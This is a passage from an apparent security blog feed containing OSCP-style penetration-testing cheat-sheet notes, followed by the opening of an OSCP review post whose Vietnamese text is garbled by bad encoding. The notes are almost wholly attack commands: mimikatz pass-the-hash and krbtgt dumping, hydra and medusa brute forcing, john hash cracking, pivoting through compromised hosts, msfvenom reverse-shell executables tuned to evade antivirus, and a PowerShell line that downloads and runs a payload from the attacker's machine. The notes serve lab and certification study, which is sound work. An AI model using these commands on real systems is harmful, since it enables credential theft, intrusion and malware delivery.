sekurlsa::pth /user:Administrator /domain:{domain name, eg. winxp} /ntlm:{ntlm hash here} /run:cmd

# krbtgt hash (Domain Controller)
lsadump::dcsync /user:krbtgt
lsadump::lsa /inject /name:krbtgt
</code></pre><h3 id="more-active-directory">More Active Directory</h3>
<ul>
<li>mimikatz (meterpreter modules)</li>
<li>mimikatz (manual lsadump)</li>
<li><code>post/windows/gather/smart_hashdump</code></li>
<li><code>post/windows/gather/credentials/gpp</code> or <code>cd &quot;C:\Windows\SYSVOL&quot; &amp;&amp; dir /s Groups.xml</code> then <code>gpp-decrypt [cpassword]</code> on Kali</li>
<li><code>post/windows/escalate/golden_ticket</code></li>
</ul>
<h4 id="14141---passing-the-hash-pth">14.1.4.1 - Passing the Hash (PTH)</h4>
<p>Authenticate using a NT/LM hash instead of the plaintext password, saving time and effort.</p>
<p>Refer to SMB enumeration section:</p>
<ul>
<li><code>CrackMapExec</code></li>
<li><code>smbmap</code></li>
<li><code>smbclient</code></li>
<li><code>pth-winexe</code></li>
<li><code>exploit/windows/smb/psexec</code></li>
</ul>
<h3 id="password-profiling-with-cewl-and-john">Password Profiling with <code>cewl</code> and <code>john</code></h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">cewl www.conglomerate.com -m <span style="color:#ae81ff">6</span> -w conglomerate-cewl.txt <span style="color:#75715e"># scrape and generate password list from words found</span>
<span style="color:#75715e"># Add two numbers to the end of each password</span>
<span style="color:#75715e"># $[0-9]$[0-9] # add this line to /etc/john/john.conf to mutate our dictionary with 2 appended digits</span>
john --wordlist<span style="color:#f92672">=</span>conglomerate-cewl.txt --rules --stdout &gt; mutated.txt
</code></pre></div><h2 id="online-password-attacks">Online Password Attacks</h2>
<h4 id="14211---medusa">14.2.1.1 - <code>medusa</code></h4>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">medusa -d <span style="color:#75715e"># list modules. modules available: cvs, ftp, http, imap, mssql, mysql, nntp, pcanywhere, pop3, postgres, rdp, rexec, rlogin, rsh, smbnt, smtp-vrfy, smtp, snmp, ssh, svn, telnet, vmauthd, vnc, web-form, wrapper</span>
medusa -h 192.168.1.23 -u admin -P password-file.txt -M http -m DIR:/admin -T <span style="color:#ae81ff">20</span> <span style="color:#75715e"># http brute force password</span>
medusa -h 192.168.1.23 -p admin -U user-file.txt -M http -m DIR:/admin -T <span style="color:#ae81ff">20</span> <span style="color:#75715e"># http brute force username</span>
</code></pre></div><h4 id="14212---ncrack">14.2.1.2 - <code>ncrack</code></h4>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#75715e"># Modules available: FTP, SSH, Telnet, HTTP(S), POP3(S), SMB, RDP, VNC, SIP, Redis, PostgreSQL, MySQL</span>
ncrack -vv --user offsec -P password-file.txt rdp://192.168.1.23 <span style="color:#75715e"># rdp brute force password</span>
ncrack -vv --password offsec -U user-file.txt rdp://192.168.1.23 <span style="color:#75715e"># rdp brute force username</span>
</code></pre></div><p>Due to the way RDP works, multiple threads are not practical in this case, which makes the brute force process rather slow.</p>
<h4 id="14213---hydra">14.2.1.3 - <code>hydra</code></h4>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#75715e"># Modules available: adam6500, asterisk, cisco, cisco-enable, cvs, firebird, ftp, ftps, http[s]-{head|get|post}, http[s]-{get|post}-form, http-proxy, http-proxy-urlenum, icq, imap[s], irc, ldap2[s], ldap3[-{cram|digest}md5][s], mssql, mysql, nntp, oracle-listener, oracle-sid, pcanywhere, pcnfs, pop3[s], postgres, radmin2, rdp, redis, rexec, rlogin, rpcap, rsh, rtsp, s7-300, sip, smb, smtp[s], smtp-enum, snmp, socks5, ssh, sshkey, svn, teamspeak, telnet[s], vmauthd, vnc, xmpp</span>
hydra -vV -l root -P password-file.txt 192.168.1.23 ftp <span style="color:#75715e"># ftp brute force password</span>
hydra -vV -p root -L user-file.txt 11.11.1.219 ftp <span style="color:#75715e"># ftp brute force username</span>
hydra -vV -l root -P password-file.txt 192.168.1.23 ssh <span style="color:#75715e"># ssh brute force password</span>
hydra -vV -l root -P fasttrack.txt -M hosts -o bruteforce ssh <span style="color:#75715e"># ssh brute force password of multiple hosts and output to file</span>
hydra -vV -f -P password-file.txt 192.168.1.23 snmp <span style="color:#75715e"># snmp brute force password, stop when found</span>
hydra -vV -f -C userpass.txt 192.168.1.23 ftp <span style="color:#75715e"># ftp brute force login, using [user]:[pass] file, stop when found</span>
hydra -vV -f -l admin -P <span style="color:#f92672">[</span>pw dict<span style="color:#f92672">]</span> -t <span style="color:#f92672">[</span>threads<span style="color:#f92672">]</span> -o <span style="color:#f92672">[</span>output<span style="color:#f92672">]</span> -s <span style="color:#f92672">[</span>port<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>host<span style="color:#f92672">]</span> http-get <span style="color:#f92672">[</span>page <span style="color:#f92672">(</span>/camera.cgi<span style="color:#f92672">)]</span>
hydra -vV -f -l admin -P <span style="color:#f92672">[</span>pw dict<span style="color:#f92672">]</span> -t <span style="color:#f92672">[</span>threads<span style="color:#f92672">]</span> -o <span style="color:#f92672">[</span>output<span style="color:#f92672">]</span> -s <span style="color:#f92672">[</span>port<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>host<span style="color:#f92672">]</span> http-form-post <span style="color:#e6db74">&#34;[post page]:[post data]:[failed attempt regex]&#34;</span>
hydra -vV -f -l admin -P /usr/share/dirb/wordlists/small.txt -t <span style="color:#ae81ff">50</span> -o login-brute-force 192.168.1.23 http-form-post <span style="color:#e6db74">&#34;/index.php:target=auth&amp;mode=login&amp;user_login=^USER^&amp;password=^PASS^:The username or password you entered is invalid&#34;</span>
hydra -e nsr <span style="color:#75715e"># n - check for null password, s - use the same username as the password, r - reverses the username and uses it as password. total +3 more requests</span>
</code></pre></div><h4 id="14215---account-lockouts-and-log-alerts">14.2.1.5 - Account Lockouts and Log Alerts</h4>
<p>Online password brute-force attacks are noisy. Generates logs, warnings, may even lock out accounts. Could be disastraous as valid users may be unable to access the service until admin re-enables their account.</p>
<h3 id="choosing-the-right-protocol-speed-vs-reward">Choosing the Right Protocol: Speed vs Reward</h3>
<p>Speed up brute-force by increasing number of threads, however, doesn&rsquo;t work on certain protocols like RDP and SMB. And on of that, RDP authentication negotiations are more time consuming than say HTTP. However even if it is slower, a successful attack on RDP would often provide a bigger reward. The hidden art behind online brute-force attacks is choosing your targets, user lists, and password files carefully and intelligently before intiating the attack.</p>
<h2 id="password-hash-attacks">Password Hash Attacks</h2>
<h3 id="identifying-a-hash">Identifying a Hash</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">$ hash-identifier
...
-------------------------------------------------------------------------
HASH: c43ee559d69bc7f691fe2fbfe8a5ef0a
Possible Hashs:
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> MD5
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Domain Cached Credentials - MD4<span style="color:#f92672">(</span>MD4<span style="color:#f92672">((</span>$pass<span style="color:#f92672">))</span>.<span style="color:#f92672">(</span>strtolower<span style="color:#f92672">(</span>$username<span style="color:#f92672">)))</span>
</code></pre></div><h3 id="john-the-ripper">John the Ripper</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">john <span style="color:#f92672">[</span>hash.txt<span style="color:#f92672">]</span> <span style="color:#75715e"># brute force</span>
john -wordlist:/usr/share/wordlists/rockyou.txt <span style="color:#f92672">[</span>hash.txt<span style="color:#f92672">]</span> <span style="color:#75715e"># dictionary</span>
john -rules -wordlist:/usr/share/wordlists/rockyou.txt -format:nt <span style="color:#f92672">[</span>hash.txt<span style="color:#f92672">]</span> <span style="color:#75715e"># dictionary + john&#39;s mangle rules</span>
john -show -format:nt <span style="color:#f92672">[</span>hash.txt<span style="color:#f92672">]</span> <span style="color:#75715e"># rmb to include the format when showing</span>

unshadow passwd shadow &gt; unshadow.txt <span style="color:#75715e"># combine them</span>
john -rules -wordlist:/usr/share/wordlists/rockyou.txt <span style="color:#f92672">[</span>unshadow.txt<span style="color:#f92672">]</span> <span style="color:#75715e"># dictionary + john&#39;s mangle rules</span>
</code></pre></div><h1 id="port-redirection-and-tunneling">Port Redirection and Tunneling</h1>
<h2 id="ssh-not-interactive">SSH not interactive</h2>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">sshpass -p <span style="color:#e6db74">&#34;monkey&#34;</span> ssh sean@10.11.1.251 
</code></pre></div><h2 id="sshutle">sshutle</h2>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">sshuttle -r sean@10.11.1.251 10.1.1.27 <span style="color:#75715e"># create connect from kali to 10.1.1.27 via 10.11.1.251</span>
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">sshuttle -r sean@10.11.1.251 10.1.1.0/24 <span style="color:#75715e"># subnet</span>
</code></pre></div><h2 id="local-port-forwarding">Local Port Forwarding</h2>
<p>Opens a local port that forwards all traffice headed to that port to the destination</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#75715e"># Alice:8080 -&gt; Bob:22 -&gt; Bob:80</span>
<span style="color:#75715e"># On Alice</span>
ssh root@bob -f -N -L 8080:localhost:80 <span style="color:#75715e"># perspective of server, localhost is the SSH server itself, Bob</span>
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#75715e"># Alice:8080 -&gt; Bob:22 -&gt; Charlie:3389</span>
<span style="color:#75715e"># On Alice</span>
ssh root@bob -f -N -L 8080:charlie:3389 <span style="color:#75715e"># perspective of server</span>
</code></pre></div><h2 id="remote-port-forwarding">Remote Port Forwarding</h2>
<p>Opens a remote port that forwards all traffic headed to that port to the destination</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#75715e"># Alice:8080 -&gt; Bob:22 -&gt; Bob:80</span>
<span style="color:#75715e"># On Bob</span>
ssh root@alice -f -N -R 8080:localhost:80 <span style="color:#75715e"># perspective of initiator, Bob</span>
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#75715e"># Alice:8080 -&gt; Bob:22 -&gt; Charlie:3389</span>
<span style="color:#75715e"># On Bob</span>
ssh root@alice -f -N -R 8080:charlie:3389 <span style="color:#75715e"># perspective of initiator, Bob</span>
</code></pre></div><h2 id="pivoting">Pivoting</h2>
<h3 id="dynamic-port-forwarding-and-proxychains">Dynamic Port Forwarding and Proxychains</h3>
<p>Opens a local port that forwards all traffic headed to that port to the destination machine, essentially allowing you to access new networks that are not directly accessible, and perform tasks such as nmap scanning without the need of installing nmap on the pivot host.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#75715e"># Alice:8080 -&gt; Bob:22 -&gt; Bob &amp; Charlie&#39;s Network:0-65535</span>

<span style="color:#75715e"># On Alice</span>
ssh root@bob -D <span style="color:#ae81ff">8080</span>
echo <span style="color:#e6db74">&#39;[ProxyList]&#39;</span> &gt; proxychains.conf
echo <span style="color:#e6db74">&#39;socks5 127.0.0.1 8080&#39;</span> &gt;&gt; proxychains.conf
proxychains nmap -T4 -n -Pn -sT -F -p <span style="color:#ae81ff">80</span> charlie
</code></pre></div><p>IMPORTANT NOTE on Proxychains and Nmap:</p>
<ul>
<li>Use <code>-sT -Pn</code> when proxychaining nmap!
<ul>
<li>ICMP (nmap host detection), UDP, nmap OS detection and non-fully established TCP connections (nmap SYN scan) will not work through proxychain, and will result in leakage, meaning your connections will go through as if without having a proxy at all, including revealing your IP address.</li>
<li>Why didn&rsquo;t proxychain work with nmap in the OffsecVM, but works on main Kali box? OffsecVM -&gt; running proxychain nmap as ROOT -&gt; defaults to SYN scan -&gt; proxychain fails to establish SOCKS connection. Main Kali -&gt; running proxychain nmap as non-privileged user -&gt; defaults to TCP scan -&gt; proxychain successfully establishes SOCKS connection.</li>
</ul>
</li>
<li>No SYN scans, ICMP, UDP and OS detection: <a href="https://security.stackexchange.com/a/122562">https://security.stackexchange.com/a/122562</a></li>
<li>Nmap and proxychains: <a href="https://ntu-offsec.github.io/blog/articles/nmap-proxychains/">https://ntu-offsec.github.io/blog/articles/nmap-proxychains/</a></li>
<li>ICMP/pings will not work with SOCKS proxy, as SOCKS is on layer 5 that acts as a proxy for TCP and UDP connections, of which ICMP requests are not. <a href="https://superuser.com/a/1030803">https://superuser.com/a/1030803</a></li>
</ul>
<p>Resources:</p>
<ul>
<li>Guide: <a href="https://netsec.ws/?p=278">https://netsec.ws/?p=278</a></li>
<li>plink, Windows ssh equivalent: <code>/usr/share/windows-binaries/plink.exe</code></li>
<li>3proxy, Windows SOCKS Proxy Server: <a href="https://forums.offensive-security.com/showthread.php?3196-15-5-1-2&amp;p=42285#post42285">https://forums.offensive-security.com/showthread.php?3196-15-5-1-2&amp;p=42285#post42285</a> <a href="https://github.com/z3APA3A/3proxy">https://github.com/z3APA3A/3proxy</a></li>
<li>IE does not proxy DNS requests!: <a href="https://forums.offensive-security.com/showthread.php?3196-15-5-1-2&amp;p=42285#post42285">https://forums.offensive-security.com/showthread.php?3196-15-5-1-2&amp;p=42285#post42285</a></li>
</ul>
<h3 id="pivoting-with-metasploit">Pivoting with Metasploit</h3>
<p>If you (192.168.1.23) compromised a host with two NICs (192.168.1.23, 10.1.1.251) on session 1, simply use <code>route add</code> and now you can target that range.</p>
<pre><code>msf &gt; route add [subnet] [netmask] [session] # alternatively, `use post/windows/manage/autoroute` (module), or `run autoroute` (meterpreter)
msf &gt; route add 10.1.1.0 255.255.255.0 1
msf &gt; route print
msf &gt; use auxiliary/scanner/http/http_version
msf auxiliary(http_version) &gt; set RHOSTS 10.1.1.0/24
</code></pre><p>Once routes are established, Metasploit modules can access the IP range specified in the routes. Scans and exploits can be directed at machines that would otherwise be unreachable from the outside, via the sessions established. For other applications to access the routes, a little bit more setup is necessary. This involves setting up the Socks4a Metasploit module and using Proxychains in conjunction with the other applications.</p>
<pre><code>msf &gt; use auxiliary/server/socks4a
msf auxiliary(socks4a) &gt; set SRVHOST 127.0.0.1
msf auxiliary(socks4a) &gt; set LPORT 1080
msf auxiliary(socks4a) &gt; exploit -j
echo '[ProxyList]' &gt; proxychains.conf
echo 'socks4 127.0.0.1 1080' &gt;&gt; proxychains.conf
proxychains nmap -T4 -n ...
</code></pre><p>Want to add the route as a default route? Meaning without proxychains, traffic headed towards the remote network will be routed automatically.</p>
<pre><code>msf &gt; use post/multi/manage/autoroute
msf post(autoroute) &gt; set SESSION session-id
msf post(autoroute) &gt; set CMD default
msf post(autoroute) &gt; exploit
# or
meterpreter &gt; run post/multi/manage/autoroute CMD=default
</code></pre><p>Resources:</p>
<ul>
<li>Autoroute, with socks4a, proxychains and default route: <a href="https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/post/multi/manage/autoroute.md">https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/post/multi/manage/autoroute.md</a></li>
<li>Pivoting multiple networks: <a href="https://pentest.blog/explore-hidden-networks-with-double-pivoting/">https://pentest.blog/explore-hidden-networks-with-double-pivoting/</a></li>
<li>LPF, RPF, and DPF (Metasploit) scenario examples: <a href="https://www.cybrary.it/0p3n/pivot-network-port-forwardingredirection-hands-look/">https://www.cybrary.it/0p3n/pivot-network-port-forwardingredirection-hands-look/</a></li>
<li>Paper with examples: <a href="https://www.sans.org/reading-room/whitepapers/testing/tunneling-pivoting-web-application-penetration-testing-36117">https://www.sans.org/reading-room/whitepapers/testing/tunneling-pivoting-web-application-penetration-testing-36117</a></li>
<li>Metasploit Unleashed Pivoting (Autoroute): <a href="https://www.offensive-security.com/metasploit-unleashed/pivoting/">https://www.offensive-security.com/metasploit-unleashed/pivoting/</a></li>
<li>Metasploit Unleashed ProxyTunnels (Autoroute + Socks4a): <a href="https://www.offensive-security.com/metasploit-unleashed/proxytunnels/">https://www.offensive-security.com/metasploit-unleashed/proxytunnels/</a></li>
</ul>
<h2 id="http-encapsulation">HTTP Encapsulation</h2>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#75715e"># Client:7070 -&gt; Server:8080 -&gt; Server:22</span>

<span style="color:#75715e"># On Server</span>
hts -F localhost:22 <span style="color:#ae81ff">8080</span>
<span style="color:#75715e"># On Client</span>
htc -F <span style="color:#ae81ff">7070</span> 192.168.161.159:8080
ssh root@localhost:7070
</code></pre></div><p>Wireshark inspection reveals normal SSH session packets are identified as &ldquo;Encrypted packets&rdquo; and have &ldquo;SSL Protocol&rdquo; fields in them. After using HTTPTunnel, the packets no longer show those, and look like ordinary TCP packets.</p>
<ul>
<li>HTTPTunnel - <a href="https://tools.kali.org/maintaining-access/httptunnel">https://tools.kali.org/maintaining-access/httptunnel</a></li>
</ul>
<h1 id="metasploit">Metasploit</h1>
<h3 id="starting">Starting</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#75715e"># PostgreSQL</span>
service postgresql start
<span style="color:#75715e"># PostgreSQL manual start</span>
sudo -H -u postgres bash -c <span style="color:#e6db74">&#34;/usr/lib/postgresql/9.6/bin/postgres -D /var/lib/postgresql/9.6/main -c config_file=/etc/postgresql/9.6/main/postgresql.conf&#34;</span>

<span style="color:#75715e"># Starting msfconsole</span>
msfconsole
</code></pre></div><p>Note, after installing either neovim or samba-4.5.15, postgresql service scripts stops working.</p>
<h3 id="usage">Usage</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#75715e"># Searching for Modules</span>
search <span style="color:#f92672">[</span>module<span style="color:#f92672">]</span>
serach type:auxiliary <span style="color:#f92672">[</span>module<span style="color:#f92672">]</span>
grep <span style="color:#f92672">[</span>keyword<span style="color:#f92672">]</span> search <span style="color:#f92672">[</span>module<span style="color:#f92672">]</span>

<span style="color:#75715e"># Module Usage</span>
use <span style="color:#f92672">[</span>module<span style="color:#f92672">]</span>
info
show options
set rhost <span style="color:#f92672">[</span>ip<span style="color:#f92672">]</span>
set rhosts <span style="color:#f92672">[</span>ips/range<span style="color:#f92672">]</span>      <span style="color:#75715e"># for modules that support multiple hosts</span>
setg rhosts <span style="color:#f92672">[</span>ips/range<span style="color:#f92672">]</span>     <span style="color:#75715e"># global/persistent set</span>
set threads <span style="color:#ae81ff">10</span>              <span style="color:#75715e"># for modules that support threads</span>
set payload windows/meterpreter/reverse_tcp <span style="color:#75715e"># optional, meterpreter is default</span>
show targets
set target <span style="color:#ae81ff">1</span>                <span style="color:#75715e"># optional, 0 is default</span>
set InitialAutoRunScript migrate -f <span style="color:#75715e"># migrate immediately after getting shell. good for client-side attacks, since victim may close the browser</span>
set EnableStageEncoding true <span style="color:#75715e"># &#34;Command shell session 1 closed.  Reason: Died from Errno::ECONNRESET&#34;? disable encoding. set to true, its a bug (https://github.com/rapid7/metasploit-framework/issues/8357)</span>
set StageEncoder <span style="color:#e6db74">&#34;generic/none&#34;</span> <span style="color:#75715e"># disable encoding.</span>
exploit

<span style="color:#75715e"># Multi Handler</span>
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp <span style="color:#75715e"># required especially for staged payloads (meterpreter and shell/etc.)</span>
set lhost 0.0.0.0
set lport <span style="color:#ae81ff">443</span>
set ExitOnSession false
exploit -j

<span style="color:#75715e"># Job Handling (when using exploit -j)</span>
jobs            <span style="color:#75715e"># list</span>
jobs -k <span style="color:#ae81ff">1</span>       <span style="color:#75715e"># kil</span>

<span style="color:#75715e"># Session Handling</span>
sessions        <span style="color:#75715e"># list</span>
sessions -i <span style="color:#ae81ff">1</span>   <span style="color:#75715e"># interact</span>
sessions -u <span style="color:#ae81ff">1</span>   <span style="color:#75715e"># upgrade shell to meterpreter</span>
sessions -k <span style="color:#ae81ff">1</span>   <span style="color:#75715e"># kill</span>

<span style="color:#75715e"># Workspaces</span>
workspace
workspace -a lab
workspace lab
workspace -d test
db_export -f xml /tmp/ms.xml
db_import /tmp/ms.xml

<span style="color:#75715e"># Database</span>
hosts
db_nmap -T4 ...
services -p <span style="color:#ae81ff">443</span>
services -p <span style="color:#ae81ff">443</span> -R  <span style="color:#75715e"># populate RHOSTS with result</span>
hosts -c address,os_flavor -S Linux <span style="color:#75715e"># 2 columns, search Linux</span>
services -c name,info -S http -R  <span style="color:#75715e"># 2 columns, search http, and populate RHOSTS with results</span>
creds
creds -a 192.168.1.23 -p <span style="color:#ae81ff">22</span> -u root -P toor
loot
</code></pre></div><h3 id="explored-modules">Explored Modules</h3>
<pre><code># Auxiliary
auxiliary/scanner/snmp/snmp_enum
auxiliary/scanner/smb/smb_version
auxiliary/scanner/http/webdav_scanner # apparently WebDAV servers are often poorly cofigured and can often lead to quick and easy shell
auxiliary/scanner/ftp/ftp_login

# Exploits
exploit/windows/smb/ms08_067_netapi
exploit/windows/smb/ms17_010_eternalblue
</code></pre><h3 id="common-payloads">Common Payloads</h3>
<h4 id="staged-payload">Staged Payload</h4>
<p>2 parts, great when there is little buffer space for shellcode. Requires multi handler to send stage 2. Meterpreter is always staged.</p>
<pre><code>[platform]/[arch?]/[shell/meterpreter]/[reverse/bind]_[protocol]
windows/meterpreter/reverse_https
linux/x86/shell/reverse_tcp
</code></pre><h4 id="non-stagedsingles-payloads">Non-Staged/Singles Payloads</h4>
<p>Entire shellcode in payload</p>
<pre><code>[platform]/[arch?]/[shell]_[reverse/bind]_[protocol]
windows/shell_reverse_tcp
linux/x86/shell_reverse_tcp
</code></pre><h3 id="meterpreter">Meterpreter</h3>
<pre><code>sysinfo
getuid
search -f *pass*.txt
download c:\\users\\bob\\passwords.txt /tmp
upload /tmp/nc.exe c:\\
hashdump
getsystem
migrate [pid] # migrate to another process, as exploited process may hung (eg. during client-side attacks) or get killed
shell # advantage is if shell dies, you can go back up to meterpreter to spawn a new one
</code></pre><pre><code>use exploit/windows/local/service_permissions
set session 1
exploit
</code></pre><h3 id="executable-payloads">Executable Payloads</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">msfvenom -p windows/shell_reverse_tcp LHOST<span style="color:#f92672">=</span>192.168.1.23 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">443</span> -f exe -e x86/shikata_ga_nai -i <span style="color:#ae81ff">9</span> -o shell.exe
msfvenom -p windows/shell_reverse_tcp LHOST<span style="color:#f92672">=</span>192.168.1.23 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">443</span> -f exe -e x86/shikata_ga_nai -i <span style="color:#ae81ff">9</span> -o shell.exe -x /usr/share/windows-binaries/plink.exe -k <span style="color:#75715e"># embed with existing program, and allow it to continue functionality with -k (spawn new thread)</span>
msfvenom -p linux/x86/exec CMD<span style="color:#f92672">=</span>/bin/sh -f elf -o gimmeshell
</code></pre></div><h3 id="custom-msf-module">Custom MSF Module</h3>
<p>Create in local directory, eg. <code>~/.msf4/modules/exploits/linux/misc</code>. Copy an existing template over like <code>/usr/share/metasploitframework/modules/exploits/linux/misc/gld_postfix.rb</code>. Change template, main part is <code>exploit</code> function.</p>
<h3 id="unicorn-powershell">Unicorn Powershell</h3>
<p>Unicorn is a simple tool for using a PowerShell downgrade attack and inject shellcode straight into memory, potentially evading firewalls.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#75715e"># On Kali:</span>
./unicorn.py <span style="color:#f92672">[</span>metasploit payload<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>reverse_ip<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>port<span style="color:#f92672">]</span> <span style="color:#75715e"># generates powershell_attack.txt (actual output) and unicorn.rc (metasploit setup script)</span>
<span style="color:#75715e"># delete the &#34;powershell&#34; wrapper and quotes around the text in powershell_attack.txt</span>
python -m SimpleHTTPServer

<span style="color:#75715e"># On Windows:</span>
powershell <span style="color:#e6db74">&#34;IEX(New-Object Net.WebClient).downloadString(&#39;http://[kali ip]:8000/powershell_attack.txt&#39;)&#34;</span> <span style="color:#75715e"># download and execute the powershell code</span>

<span style="color:#75715e"># On Kali:</span>
<span style="color:#75715e"># set up listener</span>
</code></pre></div><h1 id="bypassing-antivirus-software">Bypassing Antivirus Software</h1>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">msfvenom -p windows/shell_reverse_tcp LHOST<span style="color:#f92672">=</span>192.168.1.23 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">4444</span> -f exe -o shell.exe <span style="color:#75715e"># 30/46</span>
msfvenom -p windows/shell_reverse_tcp LHOST<span style="color:#f92672">=</span>192.168.1.23 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">4444</span> -f exe -e x86/shikata_ga_nai -i <span style="color:#ae81ff">9</span> -o shell.exe <span style="color:#75715e"># 34/46</span>
msfvenom -p windows/shell_reverse_tcp LHOST<span style="color:#f92672">=</span>192.168.1.23 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">4444</span> -f exe -e x86/shikata_ga_nai -i <span style="color:#ae81ff">9</span> -x /usr/share/windows-binaries/plink.exe -o shell.exe <span style="color:#75715e"># 27/46</span>
wine /usr/share/windows-binaries/hyperion/hyperion.exe shell.exe crypted.exe <span style="color:#75715e"># 14/46</span>
<span style="color:#75715e"># custom python reverse shell compiled to exe # 2/46</span>
<span style="color:#75715e"># custom C reverse shellcode compiled to exe # 1/46</span>
</code></pre></div><h1 id="forensics">Forensics</h1>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">strings <span style="color:#f92672">[</span>file<span style="color:#f92672">]</span>
grep -a <span style="color:#e6db74">&#39;[pattern]&#39;</span> <span style="color:#f92672">[</span>file<span style="color:#f92672">]</span>
xdd <span style="color:#f92672">[</span>file<span style="color:#f92672">]</span>
binwalk -Me <span style="color:#f92672">[</span>file<span style="color:#f92672">]</span>
testdisk <span style="color:#f92672">[</span>file<span style="color:#f92672">]</span>
photorec <span style="color:#f92672">[</span>file<span style="color:#f92672">]</span>
</code></pre></div>]]></content>
        </item>
        
        <item>
            <title>Getting the OSCP Certification: &#39;Offensive Security Certified Professional&#39; (PEN-200) review</title>
            <link>https://tranquac.github.io/posts/2021/04/getting-the-oscp-certification-offensive-security-certified-professional-pen-200-review/</link>
            <pubDate>Wed, 21 Apr 2021 00:00:00 +0000</pubDate>
            
            <guid>https://tranquac.github.io/posts/2021/04/getting-the-oscp-certification-offensive-security-certified-professional-pen-200-review/</guid>
            <description>28-4-2021 / 21 Year Old  HÃ´m nay tÃ´i ngá»“i Ä‘Ã¢y Ä‘á»ƒ viáº¿t nhá»¯ng dÃ²ng suy nghÄ© nÃ y khi tÃ´i vá»«a nháº­n Ä‘Æ°á»£c email thÃ´ng bÃ¡o tÃ´i Ä‘Ã£ vÆ°á»£t qua kÃ¬ thi OSCP cá»§a offensive security.ÄÃ¢y chá»‰ lÃ  má»™t bÃ i viáº¿t Ä‘Æ¡n giáº£n Ä‘á»ƒ tÃ´i cÃ³ thá»ƒ chia sáº» nhá»¯ng suy nghÄ©,cáº£m nháº­n vÃ  hÃ nh trÃ¬nh tÃ´i Ä‘áº¡t Ä‘Æ°á»£t chá»©ng chá»‰ OSCP trong láº§n thi Ä‘áº§u tiá»n . ÄÃ³ lÃ  cáº£ má»™t quÃ¡ trÃ¬nh gian nan, cá»‘ gáº¯ng háº¿t mÃ¬nh cá»§a tÃ´i trong 3 thÃ¡ng.</description>
            <content type="html"><![CDATA[<h3 id="28-4-2021--21-year-old">28-4-2021 / 21 Year Old</h3>
<ul>
